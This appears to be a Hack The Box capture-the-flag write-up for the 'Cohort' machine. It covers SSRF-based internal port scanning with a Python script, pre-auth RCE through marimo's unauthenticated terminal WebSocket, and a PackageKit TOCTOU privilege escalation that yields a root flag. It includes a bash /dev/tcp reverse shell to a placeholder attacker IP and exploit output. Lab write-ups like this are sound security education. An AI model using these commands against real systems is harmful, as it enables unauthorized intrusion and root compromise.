# Cohort - Hack The Box Writeup

## Reconnaissance

Before starting the enumeration, I encountered an issue where the TLS handshake initially hung indefinitely over the HTB VPN. This was an MTU/fragmentation issue on the `tun0` interface, which was resolved by lowering the MTU size:

```shell
sudo ip link set tun0 mtu 1300
```

With the VPN connection stable, I started with an Nmap scan to identify open ports and services:

```shell
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http      nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/https nginx/1.24.0 (Ubuntu)
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals SSH on port 22 and an Nginx web server running on ports 80 and 443. The SSL certificate exposes the domain name `cohort.htb` and a wildcard subdomain `*.cohort.htb`.

Browsing the web application revealed the following interfaces and endpoints:

![[Pasted image 20260904161016.png]]
![[Pasted image 20260904161144.png]]
cohort.htb/api
![[Pasted image 20260904161401.png]]
cohort.htb/api/health
![[Pasted image 20260904162005.png]]
![[Pasted image 20260904162651.png]]
![[Pasted image 20260904162719.png]]
![[Pasted image 20260904163735.png]]
![[Pasted image 20260904164224.png]]

A directory fuzzing scan using feroxbuster confirmed several accessible endpoints:

```shell
301      GET        7l       12w      178c https://cohort.htb/api => https://cohort.htb/api/
301      GET        7l       12w      178c https://cohort.htb/assets => https://cohort.htb/assets/
403      GET        7l       10w      162c https://cohort.htb/status
200      GET        1l        4w       42c https://cohort.htb/api/health
```

Further enumeration of the application functionality indicated a potential Server-Side Request Forgery (SSRF) vulnerability on the `/api/validate` endpoint. I used the following custom Python script to scan internal ports via the SSRF:

```python
# Custom script for internal port scanning via SSRF
import requests
import concurrent.futures
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://cohort.htb/portal.html",
}

URL = "https://cohort.htb/api/validate"

def check_port(port):
    payload = {"url": f"http://127.1:{port}/test.csv", "format": "json"}
    
    try:
        r = requests.post(URL, json=payload, headers=HEADERS, timeout=3, verify=False)
        data = r.json()
        mensaje = str(data.get("message", "")).lower()
        if "enter a source url" in mensaje:
            pass
        elif "refused" in mensaje or "unable to connect" in mensaje or "failed to connect" in mensaje:
            pass
        else:
            print(f"[+] Open port found! {port}")
            print(f"    Response: {data}")
            print("-" * 40)
            
    except Exception as e:
        pass

if __name__ == "__main__":
    print("Scanning ports (1-65535) with active session...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(check_port, range(1, 65536))
```

This SSRF allowed us to discover internal services and eventually led to the discovery of a dynamically generated subdomain: `nb-1be3782a8afd3ad5.cohort.htb`.

![[Pasted image 20260904171149.png]]
![[Pasted image 20260904172039.png]]

Rendering the returned HTML in the browser yielded the following results:
![[Pasted image 20260904172605.png]]
![[Pasted image 20260904172907.png]]
![[Pasted image 20260904174525.png]]

## Foothold / Initial Access

Through the newly discovered subdomain, I found an instance of **marimo**. This specific version of marimo (`< 0.23.0`) is vulnerable to a pre-authentication Remote Code Execution (RCE) vulnerability, tracked as **CVE-2026-39987**.

The vulnerability exists because the `/terminal/ws` WebSocket endpoint does not call `validate_auth()` (unlike other endpoints such as `/ws`), making it possible to obtain a full PTY shell without supplying valid credentials.

I exploited this using `websocat` to connect to the unprotected WebSocket terminal:

```shell
websocat "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
  -H "Authorization: Bearer any-value" -k
```

Since the WebSocket connection was unstable and lacked proper job control or a complete PTY, I used it to establish a proper reverse shell.

On the attacker machine, I started a netcat listener:

```shell
nc -lvnp 4444
```

Then, from the initial `websocat` session on the victim machine, I executed a bash reverse shell:

```shell
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```

Once the connection was caught by the listener, I stabilized the shell using Python:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

*(Note: If bracketed paste mode issues arise, inserting garbage characters like `^[[200~`, use `Ctrl+U` to clear the line without terminating the session.)*

## Privilege Escalation

After obtaining a stable shell as the `marimo` user, I began searching for local privilege escalation vectors. I checked the installed Debian packages and found `PackageKit`:

```shell
dpkg -l | grep -i packagekit
```

```
ii  gir1.2-packagekitglib-1.0       1.2.8-2ubuntu1.5   amd64  GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18:amd64    1.2.8-2ubuntu1.5   amd64  Library for accessing PackageKit using GLib
hi  packagekit                     1.2.8-2ubuntu1.2   amd64  Provides a package management service
ii  packagekit-tools                1.2.8-2ubuntu1.2   amd64  Provides PackageKit command-line tools
```

The status `hi` (hold + installed) indicates that this specific package version was deliberately locked from being upgraded. This is often a strong indicator of an intended vulnerable path in CTF environments.

Searching for vulnerabilities associated with `packagekit 1.2.8-2ubuntu1.2`, I discovered **CVE-2026-41651**, a **TOCTOU** (Time-of-Check to Time-of-Use) flaw in the PackageKit service. The service verifies a package before installing it, but a race condition exists. There is a time window between the validation and the actual installation where the package file can be swapped out for a malicious one, leading to code execution as `root` through the package installation service.

I downloaded and executed the exploit for CVE-2026-41651 on the target:

```shell
┌──(julicc㉿arceus)-[~/cohort.htb/exploits]
└─$ rlwrap ./websocat.x86_64-unknown-linux-musl "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
  -H "Authorization: Bearer any-value" -k
marimo@cohort:~$
/tmp/exploit
/tmp/exploit
    ______   ______    ___  ___  ___  ____     ___________ _______   / ___/ | / / __/___|_  |/ _ \|_  |/ __/____/ / <  / __// __<  /  / /__ | |/ / _//___/ __// // / __// _ \/___/_  _/ / _ \/__ \/ /   \___/ |___/___/   /____/\___/____/\___/     /_//_/\___/____/_/                  https://github.com/Lutfifakee-Project/  CVE-2026-41651 - PackageKit TOCTOU Local Privilege Escalation  ═══════════════════════════════════════════════════════════════════    [*] Building packages (pure C)...  [+] dummy   : /tmp/.pk-dummy-49009.deb  [+] payload : /tmp/.pk-payload-49009.deb
[*] Transaction : /17_cadeecba  [*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]  [*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)  [*] Loop ran for 18 ms  [*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=FOUND    [+] SUCCESS — SUID bash at t+0ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
  .suid_bash: no job control in this shell  .suid_bash-5.2#
whoami
whoami
root

.suid_bash-5.2#
cat /root/root.txt
cat /root/root.txt   5e480f709ae70cb50c2b7d1c40e1b6a2  .suid_bash-5.2#
```

The exploit successfully swapped the files during the race window, providing a SUID bash shell as the `root` user and allowing me to read the root flag.

## Conclusion

Cohort was a very interesting machine that demonstrated the risks of SSRF leading to the discovery of internal endpoints. The initial foothold showcased a realistic pre-auth WebSocket vulnerability in `marimo`. Finally, the privilege escalation highlighted a classic TOCTOU race condition in `PackageKit`, emphasizing how package managers can be abused to gain root access if they are not handling file checks securely.
